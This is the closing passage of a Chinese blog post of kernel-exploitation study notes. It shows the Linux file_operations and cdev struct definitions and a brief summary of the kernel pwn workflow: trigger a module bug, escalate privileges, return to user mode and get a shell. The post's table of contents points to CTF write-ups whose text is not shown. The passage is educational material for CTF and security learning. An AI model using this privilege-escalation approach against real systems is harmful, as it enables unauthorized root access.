class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">	<span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">	<span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">	<span class="type">ssize_t</span> (*read_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">	<span class="type">ssize_t</span> (*write_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">	<span class="type">int</span> (*iopoll)(<span class="keyword">struct</span> kiocb *kiocb, <span class="keyword">struct</span> io_comp_batch *,</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> flags);</span><br><span class="line">	<span class="type">int</span> (*iterate_shared) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">	<span class="type">__poll_t</span> (*poll) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *);</span><br><span class="line">	<span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">	<span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">	<span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> mmap_supported_flags;</span><br><span class="line">	<span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line">	<span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line">	<span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">	<span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">	<span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">	<span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">	<span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">	<span class="type">void</span> (*splice_eof)(<span class="keyword">struct</span> file *file);</span><br><span class="line">	<span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock **, <span class="type">void</span> **);</span><br><span class="line">	<span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">			  <span class="type">loff_t</span> len);</span><br><span class="line">	<span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="type">unsigned</span> (*mmap_capabilities)(<span class="keyword">struct</span> file *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">ssize_t</span> (*copy_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *,</span><br><span class="line">			<span class="type">loff_t</span>, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">	<span class="type">loff_t</span> (*remap_file_range)(<span class="keyword">struct</span> file *file_in, <span class="type">loff_t</span> pos_in,</span><br><span class="line">				   <span class="keyword">struct</span> file *file_out, <span class="type">loff_t</span> pos_out,</span><br><span class="line">				   <span class="type">loff_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> remap_flags);</span><br><span class="line">	<span class="type">int</span> (*fadvise)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*uring_cmd)(<span class="keyword">struct</span> io_uring_cmd *ioucmd, <span class="type">unsigned</span> <span class="type">int</span> issue_flags);</span><br><span class="line">	<span class="type">int</span> (*uring_cmd_iopoll)(<span class="keyword">struct</span> io_uring_cmd *, <span class="keyword">struct</span> io_comp_batch *,</span><br><span class="line">				<span class="type">unsigned</span> <span class="type">int</span> poll_flags);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>有点像proc_operations的plus版</p>
<p><strong>cdev</strong></p>
<p><code>cdev</code> 结构体是 Linux 内核中用于表示字符设备的结构体。它包含了字符设备的一些重要信息和操作函数，用于向内核注册和管理字符设备。下面是 <code>cdev</code> 结构体的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="type">dev_t</span> dev;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p><code>cdev</code> 结构体的主要成员包括：</p>
<ol>
<li><strong><code>struct kobject kobj</code>：</strong> 用于实现内核对象，与 sysfs 文件系统相关，提供一种在用户空间访问设备信息的机制。</li>
<li><strong><code>struct module *owner</code>：</strong> 拥有该字符设备的内核模块。</li>
<li><strong><code>const struct file_operations *ops</code>：</strong> 与字符设备关联的文件操作结构体，包含了指向设备的操作函数指针，如 <code>open</code>、<code>read</code>、<code>write</code>、<code>release</code> 等。</li>
<li><strong><code>struct list_head list</code>：</strong> 用于将 <code>cdev</code> 结构体链接到其他设备结构体的链表。</li>
<li><strong><code>dev_t dev</code>：</strong> 字符设备的设备号，包括主设备号和次设备号。</li>
<li><strong><code>unsigned int count</code>：</strong> 设备号的数量，通常为 1。</li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>内核pwn其实与用户态pwn并无太大的差异</p>
<p>就是通过编译执行二进制程序触发加载在内核中的模块存在的漏洞</p>
<p>想办法完成提权,然后再返回到用户态下getshell</p>
</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>kernel学习笔记1</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://ixout.github.io/posts/13785/">https://ixout.github.io/posts/13785/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>ixout</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2023-12-28</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2024-03-17</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/kernel/">kernel</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/indeximg.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/1523/" title="WASM初识"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/1536aeca2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">WASM初识</div></div></a></div><div class="next-post pull-right"><a href="/posts/4584/" title="杂题录"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/c6d6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">杂题录</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-author"><div class="item-headline"><i class="fa-solid fa-circle-user"></i><span>Author</span></div><div class="author-main-content"><div class="author-check-content"><label class="author-info" for="author-info">     <input id="author-info" type="checkbox" name="author-info"/><div class="author-avatar"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-name">ixout</div></label></div><div class="author-switch-content"><input class="switch-content" type="radio" name="switch-content" value="description"/><label class="author-description-box">      <div class="author-description"><font color="#e66b6d">十八线业余选手</font></div></label><input class="switch-content" type="radio" name="switch-content" value="social" checked="checked"/><label class="author-social-box"><a class="card-author-button" target="_blank" rel="noopener" href="https://github.com/ixout"><i class="iconfont icon-github"></i><span>Follow Me With Github</span></a><div class="social-icons"><a class="social-icon" href="https://github.com/ixout" target="_blank" title="Github"><i class="fa-brands fa-github"></i></a><a class="social-icon" href="/1425430423" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a></div></label><input class="switch-content" type="radio" name="switch-content" value="site-data"/><label class="author-data-box"><div class="site-data"><a class="data-item" href="/archives/"><div class="data-name">文章</div><div class="data-length">51</div></a><a class="data-item" href="/tags/"><div class="data-name">标签</div><div class="data-length">56</div></a><a class="data-item" href="/categories/"><div class="data-name">分类</div><div class="data-length">5</div></a></div></label></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>告示牌</span></div><div class="announcement_content"><font color="＃00CED1">(º﹃º)阿巴阿巴阿巴......</font></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2018-core"><span class="toc-number">1.</span> <span class="toc-text">强网杯 2018 - core</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kernel-ROP"><span class="toc-number">1.1.</span> <span class="toc-text">Kernel ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8A%B6%E6%80%81%E4%BF%9D%E5%AD%98"><span class="toc-number">1.1.1.</span> <span class="toc-text">状态保存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E7%94%A8%E6%88%B7%E6%80%81"><span class="toc-number">1.1.2.</span> <span class="toc-text">返回用户态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#swapgs"><span class="toc-number">1.1.3.</span> <span class="toc-text">swapgs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iretq-amp-amp-sysretq"><span class="toc-number">1.1.4.</span> <span class="toc-text">iretq&amp;&amp;sysretq</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">文件分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">模块分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.4.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E6%8B%931"><span class="toc-number">1.5.</span> <span class="toc-text">延拓1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#proc"><span class="toc-number">1.5.1.</span> <span class="toc-text">&#x2F;proc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.5.2.</span> <span class="toc-text">伪文件系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-create"><span class="toc-number">1.5.3.</span> <span class="toc-text">proc_create</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E6%8B%932"><span class="toc-number">1.6.</span> <span class="toc-text">延拓2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#x86-64%E5%A4%84%E7%90%86%E5%99%A8%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.6.1.</span> <span class="toc-text">x86-64处理器模式下的段寄存器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x86-64%E5%A4%84%E7%90%86%E5%99%A8%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84fs-gs%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.6.2.</span> <span class="toc-text">x86-64处理器模式下的fs&#x2F;gs段寄存器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E5%9C%B0%E5%9D%80%E8%8E%B7%E5%8F%96"><span class="toc-number">1.7.</span> <span class="toc-text">模块地址获取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN-2017-babydriver"><span class="toc-number">2.</span> <span class="toc-text">CISCN 2017 babydriver</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90-1"><span class="toc-number">2.1.</span> <span class="toc-text">文件分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90-1"><span class="toc-number">2.2.</span> <span class="toc-text">模块分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98"><span class="toc-number">2.2.1.</span> <span class="toc-text">细节问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">2.3.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF1"><span class="toc-number">2.3.1.</span> <span class="toc-text">思路1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF2"><span class="toc-number">2.3.2.</span> <span class="toc-text">思路2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E6%8B%93"><span class="toc-number">2.4.</span> <span class="toc-text">延拓</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dev"><span class="toc-number">2.4.1.</span> <span class="toc-text">&#x2F;dev</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dev-init"><span class="toc-number">2.4.2.</span> <span class="toc-text">dev_init</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#alloc-chrdev-region"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">alloc_chrdev_region</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cdev-init"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">cdev_init</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cdev-add"><span class="toc-number">2.4.2.3.</span> <span class="toc-text">cdev_add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#class-create"><span class="toc-number">2.4.2.4.</span> <span class="toc-text">_class_create</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#device-create"><span class="toc-number">2.4.2.5.</span> <span class="toc-text">device_create</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recommend-post"><div class="item-headline"><i class="fas fa-dharmachakra"></i><span>相关推荐</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/63384/" title="kernel学习笔记2"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/cfcb137bbbe3415.jpg" alt="kernel学习笔记2"></a><div class="content"><a class="title" href="/posts/63384/" title="kernel学习笔记2">kernel学习笔记2</a><time datetime="2024-01-08" title="发表于 2024-01-08">2024-01-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3059/" title="kernel练习记录"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/p45347545154796.png" alt="kernel练习记录"></a><div class="content"><a class="title" href="/posts/3059/" title="kernel练习记录">kernel练习记录</a><time datetime="2024-03-19" title="发表于 2024-03-19">2024-03-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By ixout</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script async src="/js/fps.js"></script><script async src="/js/title.js"></script><script src="/js/sun_moon.js" async></script><script async src="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="20px" data-random="false" async="async"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>